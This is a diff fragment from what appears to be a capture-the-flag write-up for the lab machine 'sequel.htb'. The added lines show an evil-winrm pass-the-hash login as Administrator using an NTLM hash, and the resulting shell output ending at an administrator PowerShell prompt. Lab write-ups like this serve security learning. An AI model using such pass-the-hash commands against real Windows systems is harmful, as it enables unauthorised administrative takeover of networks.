@@ -655,6 +655,19 @@ Now i have the NTLM of the administrator
 # Domain Admin
 
 ```python
+evil-winrm -i sequel.htb -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+```python
 
 ```
 
